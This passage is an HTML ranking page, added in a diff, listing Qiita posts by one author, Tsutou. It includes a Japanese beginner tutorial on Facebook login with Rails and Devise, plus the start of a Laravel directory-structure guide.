+<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>
+
+<p>わざわざコードを書かなくても、空いた時間に上記リファレンスなどを参照しながら、色々な文字列に対して、おまけの各ツール使用し、結果を確認していけば、訳のわからない複雑な正規表現パターンもだんだん読めるようになってくると思います。(私も頑張ります)<br>
+<br><br>
+<br></p>
+</div>
+	</td>
+</tr>
+</table>
+<br />
+<table border="1">
+<tr>
+	<td rowspan="3"><center>Tsutouさんの<br />4位</center></td>
+	<td colspan="4">
+		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>6</kbd>
+		<a target="_blank" href="https://qiita.com/Tsutou/items/bdfd9428757c25d407bb">[ Rails ] Deviseによる3分Facebookログイン(開発初心者向け)</a>
+	</td>
+</tr>
+<tr>
+	<td style="width:100px;"><center>投稿日時</center></td>
+	<td style="width:200px;"><center>投稿者</center></td>
+	<td style="width:150px;"><center>タグ</center></td>
+	<td style="width:350px;"><center>本文</center></td>
+</tr>
+<tr>
+	<td style="width:100px;">
+		<!--投稿日時--><center>2017-09-16 22:06:04</center>
+	</td>
+	<td style="width:200px;">
+		@Tsutou<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/187392/profile-images/1505559295">
+	</td>
+	<td style="width:150px;">
+		<!--タグ-->
+		<center><b>[Ruby]</b> <b>[Rails]</b> <b>[devise]</b> <b>[api]</b> <b>[FacebookSDK]</b> </center>
+	</td>
+	<td style="width:350px;">
+		<!--本文-->
+		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>　<br>
+Facebookログイン機能、あったら便利ですよね。<br>
+でも、クイックスタート参照してもできない...リモートでバグる...などAPIの導入はそれなりに骨が折れます。<br>
+ただ、deviseの力を借り、少し仕組みがわかれば、初心者でも環境問わず、3分でできます！</p>
+
+<h1>
+<span id="事前準備" class="fragment"></span><a href="#%E4%BA%8B%E5%89%8D%E6%BA%96%E5%82%99"><i class="fa fa-link"></i></a>事前準備</h1>
+
+<h2>
+<span id="facebook-for-developpersに登録" class="fragment"></span><a href="#facebook-for-developpers%E3%81%AB%E7%99%BB%E9%8C%B2"><i class="fa fa-link"></i></a>Facebook for developpersに登録</h2>
+
+<h2>
+<span id="1まずアカウント登録しアプリケーションを登録する" class="fragment"></span><a href="#1%E3%81%BE%E3%81%9A%E3%82%A2%E3%82%AB%E3%82%A6%E3%83%B3%E3%83%88%E7%99%BB%E9%8C%B2%E3%81%97%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E7%99%BB%E9%8C%B2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>1.まずアカウント登録しアプリケーションを登録する。</h2>
+
+<p>ダッシュボードを参照。自分のアプリケーションの登録を確認。<br>
+<a href="https://camo.qiitausercontent.com/263ac5f54cbd6fd6bd8599b89a48dd7dd5cda2e9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f65303465316334632d653564612d643730622d333132342d3965353135633535656438382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/263ac5f54cbd6fd6bd8599b89a48dd7dd5cda2e9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f65303465316334632d653564612d643730622d333132342d3965353135633535656438382e706e67" alt="スクリーンショット 2017-09-16 20.50.12.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/187392/e04e1c4c-e5da-d70b-3124-9e515c55ed88.png"></a></p>
+
+<h2>
+<span id="2サイトurlを登録する" class="fragment"></span><a href="#2%E3%82%B5%E3%82%A4%E3%83%88url%E3%82%92%E7%99%BB%E9%8C%B2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>2.サイトURLを登録する。</h2>
+
+<p>ローカル環境で動かしたければlocalhost、production環境で動かしたければURLをそのまま貼り付けます。<br>
+表示名、アプリアイコンは良きタイミングで。<br>
+<a href="https://camo.qiitausercontent.com/5f67aeec100bb2c3e9b7ad7656d32abf65158aa2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f32326537366165392d353736352d643236372d306333382d3133306132383064373339322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5f67aeec100bb2c3e9b7ad7656d32abf65158aa2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f32326537366165392d353736352d643236372d306333382d3133306132383064373339322e706e67" alt="スクリーンショット 2017-09-16 20.50.25.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/187392/22e76ae9-5765-d267-0c38-130a280d7392.png"></a></p>
+
+<h2>
+<span id="3本番環境への移行" class="fragment"></span><a href="#3%E6%9C%AC%E7%95%AA%E7%92%B0%E5%A2%83%E3%81%B8%E3%81%AE%E7%A7%BB%E8%A1%8C"><i class="fa fa-link"></i></a>3.本番環境への移行</h2>
+
+<p>リモートで動かしたいのであれば、追加で以下のように登録ステータスを開発環境から本番環境へ変更しなければなりません<br>
+<a href="https://camo.qiitausercontent.com/bf40fe151730415dbd0c34d731ae62a6ee0e5881/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f61646663633066382d326130622d636438312d613931352d3131336562333534663165302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/bf40fe151730415dbd0c34d731ae62a6ee0e5881/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f61646663633066382d326130622d636438312d613931352d3131336562333534663165302e706e67" alt="スクリーンショット 2017-09-16 20.51.48.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/187392/adfcc0f8-2a0b-cd81-a915-113eb354f1e0.png"></a></p>
+
+<h1>
+<span id="コード記述" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89%E8%A8%98%E8%BF%B0"><i class="fa fa-link"></i></a>コード記述</h1>
+
+<ul>
+<li>local、production共通です。</li>
+<li>devise導入済み、データベース、アプリケーションは生成済みとします。</li>
+<li>devise管理下のmodel,tableはuserと仮定します</li>
+<li>デプロイ先はherokuと仮定します。</li>
+<li>アプリIDとパスワードは環境変数に入れてあげましょう。</li>
+</ul>
+
+<h2>
+<span id="1gemをインストールします" class="fragment"></span><a href="#1gem%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%97%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>1.gemをインストールします。</h2>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">Gemfile</span></div>
+<div class="highlight"><pre><span></span><span class="n">gem</span> <span class="s1">'omniauth'</span>
+<span class="n">gem</span> <span class="s1">'omniauth-facebook'</span>
+</pre></div>
+</div>
+
+<h2>
+<span id="2usersテーブルに以下のカラムを追加します" class="fragment"></span><a href="#2users%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AB%E4%BB%A5%E4%B8%8B%E3%81%AE%E3%82%AB%E3%83%A9%E3%83%A0%E3%82%92%E8%BF%BD%E5%8A%A0%E3%81%97%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>2.usersテーブルに以下のカラムを追加します。</h2>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">AddOmniauthToUser.rb</span></div>
+<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">AddOmniauthToUsers</span> <span class="o">&lt;</span> <span class="no">ActiveRecord</span><span class="o">::</span><span class="no">Migration</span><span class="o">[</span><span class="mi">5</span><span class="o">.</span><span class="mi">0</span><span class="o">]</span>
+  <span class="k">def</span> <span class="nf">change</span>
+    <span class="c1"># omniauthプロバイダー情報(今回はFacebook)</span>
+    <span class="n">add_column</span> <span class="ss">:users</span><span class="p">,</span> <span class="ss">:provider</span><span class="p">,</span> <span class="ss">:string</span>
+    <span class="c1"># omniauthログイン用インデックス</span>
+    <span class="n">add_column</span> <span class="ss">:users</span><span class="p">,</span> <span class="ss">:uid</span><span class="p">,</span> <span class="ss">:string</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</pre></div>
+</div>
+
+<h2>
+<span id="3deviseの設定ファイルに以下の記述をご自身のapiキーとともに追記してください" class="fragment"></span><a href="#3devise%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AB%E4%BB%A5%E4%B8%8B%E3%81%AE%E8%A8%98%E8%BF%B0%E3%82%92%E3%81%94%E8%87%AA%E8%BA%AB%E3%81%AEapi%E3%82%AD%E3%83%BC%E3%81%A8%E3%81%A8%E3%82%82%E3%81%AB%E8%BF%BD%E8%A8%98%E3%81%97%E3%81%A6%E3%81%8F%E3%81%A0%E3%81%95%E3%81%84"><i class="fa fa-link"></i></a>3.deviseの設定ファイルに以下の記述をご自身のAPIキーとともに追記してください。</h2>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">devise.rb</span></div>
+<div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">'omniauth'</span>
+<span class="nb">require</span> <span class="s1">'omniauth-facebook'</span>
+
+<span class="n">config</span><span class="o">.</span><span class="n">omniauth</span> <span class="ss">:facebook</span><span class="p">,</span><span class="s1">'アプリIDが入ります'</span><span class="p">,</span><span class="s1">'app secretが入ります'</span>
+</pre></div>
+</div>
+
+<h2>
+<span id="4デバイスが自動生成してくれるモデルの設定を以下のように追記します" class="fragment"></span><a href="#4%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%81%8C%E8%87%AA%E5%8B%95%E7%94%9F%E6%88%90%E3%81%97%E3%81%A6%E3%81%8F%E3%82%8C%E3%82%8B%E3%83%A2%E3%83%87%E3%83%AB%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%82%92%E4%BB%A5%E4%B8%8B%E3%81%AE%E3%82%88%E3%81%86%E3%81%AB%E8%BF%BD%E8%A8%98%E3%81%97%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>4.デバイスが自動生成してくれるモデルの設定を以下のように追記します。</h2>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">user.rb</span></div>
+<div class="highlight"><pre><span></span>  <span class="n">devise</span> <span class="ss">:database_authenticatable</span><span class="p">,</span> <span class="ss">:registerable</span><span class="p">,</span>
+         <span class="ss">:recoverable</span><span class="p">,</span> <span class="ss">:rememberable</span><span class="p">,</span> <span class="ss">:trackable</span><span class="p">,</span> <span class="ss">:validatable</span>
+</pre></div>
+</div>
+
+<p>↓</p>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">user.rb</span></div>
+<div class="highlight"><pre><span></span>  <span class="n">devise</span> <span class="ss">:database_authenticatable</span><span class="p">,</span> <span class="ss">:registerable</span><span class="p">,</span>
+         <span class="ss">:recoverable</span><span class="p">,</span> <span class="ss">:rememberable</span><span class="p">,</span> <span class="ss">:trackable</span><span class="p">,</span> <span class="ss">:validatable</span><span class="p">,</span><span class="ss">:omniauthable</span><span class="p">,</span> <span class="ss">omniauth_providers</span><span class="p">:</span> <span class="o">[</span><span class="ss">:facebook</span><span class="o">]</span>
+</pre></div>
+</div>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">user.rb</span></div>
+<div class="highlight"><pre><span></span><span class="c1">#Facebookログインへの橋渡し</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">from_omniauth</span><span class="p">(</span><span class="n">auth</span><span class="p">)</span>
+    <span class="n">where</span><span class="p">(</span><span class="ss">provider</span><span class="p">:</span> <span class="n">auth</span><span class="o">.</span><span class="n">provider</span><span class="p">,</span> <span class="ss">uid</span><span class="p">:</span> <span class="n">auth</span><span class="o">.</span><span class="n">uid</span><span class="p">)</span><span class="o">.</span><span class="n">first_or_create</span> <span class="k">do</span> <span class="o">|</span><span class="n">user</span><span class="o">|</span>
+      <span class="n">user</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span><span class="o">.</span><span class="n">name</span>
+      <span class="n">user</span><span class="o">.</span><span class="n">email</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span><span class="o">.</span><span class="n">email</span>
+      <span class="n">user</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="no">Devise</span><span class="o">.</span><span class="n">friendly_token</span><span class="o">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="o">]</span>
+      <span class="c1"># imageカラムの場合この記述(筆者のUploderはキャリアウェーブ)</span>
+      <span class="n">user</span><span class="o">.</span><span class="n">remote_image_url</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span><span class="o">.</span><span class="n">image</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="s1">'http://'</span><span class="p">,</span><span class="s1">'https://'</span><span class="p">)</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+</pre></div>
+</div>
+
+<h2>
+<span id="5コマンドプロンプトからrails-g-devisecontrollers-usersでdevise内部のomniauth-controllerを引っ張り出します" class="fragment"></span><a href="#5%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%83%97%E3%83%AD%E3%83%B3%E3%83%97%E3%83%88%E3%81%8B%E3%82%89rails-g-devisecontrollers-users%E3%81%A7devise%E5%86%85%E9%83%A8%E3%81%AEomniauth-controller%E3%82%92%E5%BC%95%E3%81%A3%E5%BC%B5%E3%82%8A%E5%87%BA%E3%81%97%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>5.コマンドプロンプトからrails g devise:controllers usersでdevise内部のomniauth controllerを引っ張り出します。</h2>
+
+<h3>
+<span id="facebookでのログイン方式を以下のように指定" class="fragment"></span><a href="#facebook%E3%81%A7%E3%81%AE%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E6%96%B9%E5%BC%8F%E3%82%92%E4%BB%A5%E4%B8%8B%E3%81%AE%E3%82%88%E3%81%86%E3%81%AB%E6%8C%87%E5%AE%9A"><i class="fa fa-link"></i></a>facebookでのログイン方式を以下のように指定。</h3>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">omniauth_callbacks_controller.rb</span></div>
+<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Users</span><span class="o">::</span><span class="no">OmniauthCallbacksController</span> <span class="o">&lt;</span> <span class="no">Devise</span><span class="o">::</span><span class="no">OmniauthCallbacksController</span>
+
+  <span class="k">def</span> <span class="nf">facebook</span>
+    <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">from_omniauth</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">env</span><span class="o">[</span><span class="s2">"omniauth.auth"</span><span class="o">]</span><span class="p">)</span><span class="c1">#ここでモデルに記述した橋渡しメソッドを使用</span>
+    <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">persisted?</span>
+      <span class="n">sign_in_and_redirect</span> <span class="vi">@user</span><span class="p">,</span> <span class="ss">:event</span> <span class="o">=&gt;</span> <span class="ss">:authentication</span> 
+      <span class="n">set_flash_message</span><span class="p">(</span><span class="ss">:notice</span><span class="p">,</span> <span class="ss">:success</span><span class="p">,</span> <span class="ss">:kind</span> <span class="o">=&gt;</span> <span class="s2">"Facebook"</span><span class="p">)</span>  <span class="k">if</span> <span class="n">is_navigational_format?</span>
+    <span class="k">else</span>
+      <span class="n">session</span><span class="o">[</span><span class="s2">"devise.facebook_data"</span><span class="o">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">env</span><span class="o">[</span><span class="s2">"omniauth.auth"</span><span class="o">]</span>
+      <span class="n">redirect_to</span> <span class="n">new_user_registration_url</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">failure</span>
+    <span class="n">redirect_to</span> <span class="n">root_path</span>
+  <span class="k">end</span>
+
+<span class="k">end</span>
+</pre></div>
+</div>
+
+<h2>
+<span id="6デバイスのコントローラーをカスタマイズしたのでdeviseにそれを教えてあげましょう" class="fragment"></span><a href="#6%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%81%AE%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%A9%E3%83%BC%E3%82%92%E3%82%AB%E3%82%B9%E3%82%BF%E3%83%9E%E3%82%A4%E3%82%BA%E3%81%97%E3%81%9F%E3%81%AE%E3%81%A7devise%E3%81%AB%E3%81%9D%E3%82%8C%E3%82%92%E6%95%99%E3%81%88%E3%81%A6%E3%81%82%E3%81%92%E3%81%BE%E3%81%97%E3%82%87%E3%81%86"><i class="fa fa-link"></i></a>6.デバイスのコントローラーをカスタマイズしたので、deviseにそれを教えてあげましょう。</h2>
+
+<h3>
+<span id="他のコントローラーを編集する場合にもこの作業は必要になります" class="fragment"></span><a href="#%E4%BB%96%E3%81%AE%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%A9%E3%83%BC%E3%82%92%E7%B7%A8%E9%9B%86%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88%E3%81%AB%E3%82%82%E3%81%93%E3%81%AE%E4%BD%9C%E6%A5%AD%E3%81%AF%E5%BF%85%E8%A6%81%E3%81%AB%E3%81%AA%E3%82%8A%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>他のコントローラーを編集する場合にもこの作業は必要になります。</h3>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">route.rb</span></div>
+<div class="highlight"><pre><span></span><span class="n">devise_for</span> <span class="ss">:users</span><span class="p">,</span><span class="ss">:controllers</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="ss">:omniauth_callbacks</span> <span class="o">=&gt;</span> <span class="s2">"users/omniauth_callbacks"</span> <span class="p">}</span>
+</pre></div>
+</div>
+
+<h2>
+<span id="7assetsjavascript配下にアプリidとともに以下のjsファイルを設置してあげましょう" class="fragment"></span><a href="#7assetsjavascript%E9%85%8D%E4%B8%8B%E3%81%AB%E3%82%A2%E3%83%97%E3%83%AAid%E3%81%A8%E3%81%A8%E3%82%82%E3%81%AB%E4%BB%A5%E4%B8%8B%E3%81%AEjs%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E8%A8%AD%E7%BD%AE%E3%81%97%E3%81%A6%E3%81%82%E3%81%92%E3%81%BE%E3%81%97%E3%82%87%E3%81%86"><i class="fa fa-link"></i></a>7.assets/javascript配下にアプリIDとともに、以下のjsファイルを設置してあげましょう。</h2>
+
+<h3>
+<span id="以下のjsファイルがfacebook-sdkとあなたのアプリケーションをつなげます" class="fragment"></span><a href="#%E4%BB%A5%E4%B8%8B%E3%81%AEjs%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%8Cfacebook-sdk%E3%81%A8%E3%81%82%E3%81%AA%E3%81%9F%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E3%81%A4%E3%81%AA%E3%81%92%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>以下のjsファイルがFacebook SDKとあなたのアプリケーションをつなげます。</h3>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">facebook.js</span></div>
+<div class="highlight"><pre><span></span><span class="err">$</span><span class="p">(</span><span class="n">function</span><span class="p">(){</span>
+  <span class="n">window</span><span class="o">.</span><span class="n">fbAsyncInit</span> <span class="o">=</span> <span class="n">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="no">FB</span><span class="o">.</span><span class="n">init</span><span class="p">({</span>
+      <span class="n">appId</span>      <span class="p">:</span> <span class="s1">'あなたのアプリケーションIDが入ります'</span><span class="p">,</span>
+      <span class="n">cookie</span>     <span class="p">:</span> <span class="kp">true</span><span class="p">,</span>
+      <span class="n">xfbml</span>      <span class="p">:</span> <span class="kp">true</span><span class="p">,</span>
+      <span class="n">version</span>    <span class="p">:</span> <span class="s1">'v2.8'</span>
+    <span class="p">});</span>
+    <span class="no">FB</span><span class="o">.</span><span class="n">AppEvents</span><span class="o">.</span><span class="n">logPageView</span><span class="p">();</span>
+  <span class="p">};</span>
+
+  <span class="p">(</span><span class="n">function</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="nb">id</span><span class="p">){</span>
+     <span class="n">var</span> <span class="n">js</span><span class="p">,</span> <span class="n">fjs</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">getElementsByTagName</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">;</span>
+     <span class="k">if</span> <span class="p">(</span><span class="n">d</span><span class="o">.</span><span class="n">getElementById</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span><span class="p">;}</span>
+     <span class="n">js</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">createElement</span><span class="p">(</span><span class="n">s</span><span class="p">);</span> <span class="n">js</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="nb">id</span><span class="p">;</span>
+     <span class="n">js</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="s2">"//connect.facebook.net/en_US/sdk.js"</span><span class="p">;</span>
+     <span class="n">fjs</span><span class="o">.</span><span class="n">parentNode</span><span class="o">.</span><span class="n">insertBefore</span><span class="p">(</span><span class="n">js</span><span class="p">,</span> <span class="n">fjs</span><span class="p">);</span>
+   <span class="p">}(</span><span class="n">document</span><span class="p">,</span> <span class="s1">'script'</span><span class="p">,</span> <span class="s1">'facebook-jssdk'</span><span class="p">));</span>
+
+  <span class="n">function</span> <span class="n">checkLoginState</span><span class="p">()</span> <span class="p">{</span>
+  <span class="no">FB</span><span class="o">.</span><span class="n">getLoginStatus</span><span class="p">(</span><span class="n">function</span><span class="p">(</span><span class="n">response</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">statusChangeCallback</span><span class="p">(</span><span class="n">response</span><span class="p">);</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="p">});</span>
+</pre></div>
+</div>
+
+<h2>
+<span id="8実装したい箇所のビューファイルに以下の記述でボタンを設置します" class="fragment"></span><a href="#8%E5%AE%9F%E8%A3%85%E3%81%97%E3%81%9F%E3%81%84%E7%AE%87%E6%89%80%E3%81%AE%E3%83%93%E3%83%A5%E3%83%BC%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AB%E4%BB%A5%E4%B8%8B%E3%81%AE%E8%A8%98%E8%BF%B0%E3%81%A7%E3%83%9C%E3%82%BF%E3%83%B3%E3%82%92%E8%A8%AD%E7%BD%AE%E3%81%97%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>　8.実装したい箇所のビューファイルに以下の記述でボタンを設置します。</h2>
+
+<h3>
+<span id="ルーティングのprefixはrails-routesにてご確認ください" class="fragment"></span><a href="#%E3%83%AB%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%AEprefix%E3%81%AFrails-routes%E3%81%AB%E3%81%A6%E3%81%94%E7%A2%BA%E8%AA%8D%E3%81%8F%E3%81%A0%E3%81%95%E3%81%84"><i class="fa fa-link"></i></a>ルーティングのprefixはrails routesにてご確認ください。</h3>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">実装したい.haml</span></div>
+<div class="highlight"><pre><span></span><span class="o">=</span> <span class="n">link_to</span> <span class="s2">"Facebookでログイン"</span><span class="p">,</span> <span class="n">user_facebook_omniauth_authorize_path</span><span class="p">,</span> <span class="ss">class</span><span class="p">:</span> <span class="s2">"login-button facebook"</span> <span class="p">,</span><span class="nb">method</span><span class="p">:</span> <span class="ss">:post</span>
+</pre></div>
+</div>
+
+<p>　</p>
+
+<h4>
+<span id="以上で完成です簡易的ですがこれでfacebookログインが可能となります" class="fragment"></span><a href="#%E4%BB%A5%E4%B8%8A%E3%81%A7%E5%AE%8C%E6%88%90%E3%81%A7%E3%81%99%E7%B0%A1%E6%98%93%E7%9A%84%E3%81%A7%E3%81%99%E3%81%8C%E3%81%93%E3%82%8C%E3%81%A7facebook%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E3%81%8C%E5%8F%AF%E8%83%BD%E3%81%A8%E3%81%AA%E3%82%8A%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>以上で完成です。簡易的ですがこれでFacebookログインが可能となります。　　</h4>
+
+<h4>
+<span id="不明点や追記した方がいい部分があればコメントいただければ幸いです" class="fragment"></span><a href="#%E4%B8%8D%E6%98%8E%E7%82%B9%E3%82%84%E8%BF%BD%E8%A8%98%E3%81%97%E3%81%9F%E6%96%B9%E3%81%8C%E3%81%84%E3%81%84%E9%83%A8%E5%88%86%E3%81%8C%E3%81%82%E3%82%8C%E3%81%B0%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88%E3%81%84%E3%81%9F%E3%81%A0%E3%81%91%E3%82%8C%E3%81%B0%E5%B9%B8%E3%81%84%E3%81%A7%E3%81%99"><i class="fa fa-link"></i></a>不明点や、追記した方がいい部分があればコメントいただければ幸いです。</h4>
+</div>
+	</td>
+</tr>
+</table>
+<br />
+<table border="1">
+<tr>
+	<td rowspan="3"><center>Tsutouさんの<br />5位</center></td>
+	<td colspan="4">
+		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>5</kbd>
+		<a target="_blank" href="https://qiita.com/Tsutou/items/80717884aee96fa804eb">Laravelのディレクトリ構造と、お役立ちTips</a>
+	</td>
+</tr>
+<tr>
+	<td style="width:100px;"><center>投稿日時</center></td>
+	<td style="width:200px;"><center>投稿者</center></td>
+	<td style="width:150px;"><center>タグ</center></td>
+	<td style="width:350px;"><center>本文</center></td>
+</tr>
+<tr>
+	<td style="width:100px;">
+		<!--投稿日時--><center>2017-11-15 17:18:03</center>
+	</td>
+	<td style="width:200px;">
+		@Tsutou<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/187392/profile-images/1505559295">
+	</td>
+	<td style="width:150px;">
+		<!--タグ-->
+		<center><b>[PHP]</b> <b>[初心者]</b> <b>[laravel]</b> <b>[laravel5]</b> <b>[PHP7]</b> </center>
+	</td>
+	<td style="width:350px;">
+		<!--本文-->
+		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
+<h1>
+<span id="laravelのディレクトリ構造" class="fragment"></span><a href="#laravel%E3%81%AE%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%A7%8B%E9%80%A0"><i class="fa fa-link"></i></a>Laravelのディレクトリ構造</h1>
+
+<p>Laravelを触り始めて一ヶ月が経ちましたが、Laravelで作るアプリがどう生成されているのか、よくわからないファイルやディレクトリだらけでした。</p>
+
+<p>ですので、これから始める方のためになれば、そして自分の索引として活用できたらなと思い、ディレクトリ構造を、勉強になった記事と一緒に、ある程度わかりやすくまとめてみました。</p>
+
+<p><strong>Composer 1.5.2/Laravel5系(5.5)/PHP7.1環境でlaravel new ~~した場合に生成されるファイルたちです。</strong></p>
+
+<h2>
+<span id="直下ファイル" class="fragment"></span><a href="#%E7%9B%B4%E4%B8%8B%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB"><i class="fa fa-link"></i></a>直下ファイル</h2>
+
+<h4>
+<span id="env" class="fragment"></span><a href="#env"><i class="fa fa-link"></i></a><strong><code>.env</code></strong>
+</h4>
+
+<p>環境設定ファイル。1環境&lt;=&gt;1envファイル。<br>
+DB NAMEやらHOSTのIP,PORT,PASSWORDなど、動作環境、環境変数に関する記述をする。<br>
+<a href="http://blog.infosuite.jp/php-dotenv/" rel="nofollow noopener" target="_blank">PHP dotenv (phpdotenv) 環境変数を本番、検証、開発環境毎に分ける</a></p>
+
+<h4>
+<span id="gitattributesgitignore" class="fragment"></span><a href="#gitattributesgitignore"><i class="fa fa-link"></i></a><strong><code>.gitattributes,.gitignore</code></strong>
+</h4>
+
+<p>git利用に関する記述。アプリケーション内の特定ファイルをgitでバージョン管理したくない場合、.gitignoreに詳細を記載したりする。<br>
+<a href="http://recipes.laravel.jp/recipe/95" rel="nofollow noopener" target="_blank">Laravel Recipes日本語版 | Gitを使ってプロジェクトを管理する</a></p>
+
+<h4>
+<span id="artisan" class="fragment"></span><a href="#artisan"><i class="fa fa-link"></i></a><strong><code>artisan</code></strong>
+</h4>
+
+<p>artisanコマンドについての記述</p>
+
+<h4>
+<span id="composerjson" class="fragment"></span><a href="#composerjson"><i class="fa fa-link"></i></a><strong><code>composer.json</code></strong>
+</h4>
+
+<p>composerの利用に関するもの。周辺技術パッケージのバージョン参照などに困ったらここに書いてある。<br>
+<a href="https://qiita.com/masarufuruya/items/23131a465b7e9c8f3060" id="reference-46f22e5b50bfe507ed56">composer.json、composer.lockって何なの？という人向けのまとめ</a></p>
+
+<p>composer.json=&gt;<strong><em><code>composer update</code></em></strong>の時に読み込む。<br>
+composer.lock=&gt;<strong><em><code>composer install</code></em></strong>の時に読み込む。</p>
+
+<h4>
+<span id="packagejson" class="fragment"></span><a href="#packagejson"><i class="fa fa-link"></i></a><strong><code>package.json</code></strong>
+</h4>
+
